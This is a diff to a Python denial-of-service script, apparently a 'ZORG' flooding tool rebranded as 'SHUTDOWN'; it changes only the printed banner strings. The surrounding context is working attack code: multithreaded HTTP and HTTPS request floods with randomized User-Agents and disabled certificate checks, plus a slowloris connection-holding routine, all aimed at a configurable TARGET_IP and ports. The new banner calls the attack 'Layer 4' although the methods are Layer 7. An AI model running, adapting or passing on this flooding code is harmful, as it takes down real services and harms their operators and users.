@@ -36,7 +36,7 @@ def http_flood(ip, port):
             url = f"http://{ip}:{port}{random.choice(paths)}"
             headers = {"User-Agent": ua.random}
             requests.get(url, headers=headers, timeout=5)
-            print(f"[ZORG👽] HTTP FLOOD: {url}")
+            print(f"[SHUTDOWN] HTTP FLOOD: {url}")
         except:
             pass
         time.sleep(REQUEST_DELAY)
@@ -49,7 +49,7 @@ def https_flood(ip, port):
             url = f"https://{ip}:{port}{random.choice(paths)}"
             headers = {"User-Agent": ua.random}
             requests.get(url, headers=headers, timeout=5, verify=False)
-            print(f"[ZORG👽] HTTPS FLOOD: {url}")
+            print(f"[SHUTDOWN] HTTPS FLOOD: {url}")
         except:
             pass
         time.sleep(REQUEST_DELAY)
@@ -62,14 +62,14 @@ def slowloris(ip, port):
             url = f"http://{ip}:{port}/"
             s = requests.Session()
             s.get(url, headers=slowloris_headers, stream=True, timeout=1000)
-            print(f"[ZORG👽] SLOWLORIS OPEN: {ip}:{port}")
+            print(f"[SHUTDOWN] SLOWLORIS OPEN: {ip}:{port}")
             time.sleep(1000)  # Keep connection open
         except:
             pass
 
 # --- MAIN ATTACK ---
 def start_attack():
-    print(f"[ZORG👽] UNLEASHING LAYER 7 HELL ON {TARGET_IP}!")
+    print(f"[SHUTDOWN] UNLEASHING LAYER 4 HELL ON {TARGET_IP}!")
     for port in TARGET_PORTS:
         for _ in range(THREAD_COUNT // len(TARGET_PORTS)):
             threading.Thread(target=http_flood, args=(TARGET_IP, port)).start()
@@ -79,3 +79,4 @@ def start_attack():
 # --- RUN ---
 if __name__ == "__main__":
     start_attack()
+
